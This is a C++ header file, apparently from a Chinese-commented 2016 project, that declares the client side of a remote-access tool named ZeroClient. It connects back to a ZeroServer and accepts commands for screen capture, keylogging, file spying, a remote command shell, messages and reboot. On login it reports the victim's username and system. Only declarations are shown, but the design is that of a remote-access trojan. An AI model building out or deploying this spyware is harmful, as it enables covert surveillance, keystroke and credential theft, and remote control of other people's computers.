/*
 *
 *  Author: sumkee911@gmail.com
 *  Date: 20-12-2016
 *  Brief: 负责接收处理从ZeroServer服务端发过来的数据
 *
 */

#ifndef ZEROCLIENT_H
#define ZEROCLIENT_H

#include "tcpsocket.h"
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include "screenspy.h"
#include "keyboardspy.h"
#include "filespy.h"
#include "cmdspy.h"

class ZeroClient
{
public:
    ZeroClient();

    HINSTANCE hInst;    // 本应用程序的实例句柄

    // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)
    const std::string CmdScreenSpy = "SCREEN_SPY";
    const std::string CmdKeyboardSpy = "KEYBOARD_SPY";
    const std::string CmdFileSpy = "FILE_SPY";
    const std::string CmdCmdSpy = "CMD_SPY";
    const std::string CmdSendMessage = "SEND_MESSAGE";
    const std::string CmdReboot = "REBOOT";
    const std::string CmdQuit = "QUIT";

    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
    const std::string CmdLogin = "LOGIN";

    // 分割符号和结束符号，比如登入命令:LOGIN<分割符>SYSTEM<分割符>Windows 7<分割符>USER_NAME<分割符>sumkee911<结束符号>
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";

    // 连接至服务端
    void connectTo(std::string domain, int port);

private:
    TcpSocket mSock;    // 与服务端连接的socket
    std::string mBuf;    // 数据缓冲区

    // 获取本机用户名和系统型号
    std::string getUserName();
    std::string getSystemModel();

    // 发送命令
    bool sendLogin();

    // 数据处理函数
    void addDataToBuffer(char *data, int size);
    void processCmd(std::string &cmd, std::string &data);
    std::map<std::string, std::string> parseArgs(std::string &data);

    // 相应于各个指令的处理函数
    void doScreenSpy(std::map<std::string, std::string> &args);
    void doKeyboardSpy(std::map<std::string, std::string> &args);
    void doFileSpy(std::map<std::string, std::string> &args);
    void doCmdSpy(std::map<std::string, std::string> &args);
    void doSendMessage(std::map<std::string, std::string> &args);
    void doReboot(std::map<std::string, std::string> &args);
    void doQuit(std::map<std::string, std::string> &args);
};

#endif // ZEROCLIENT_H
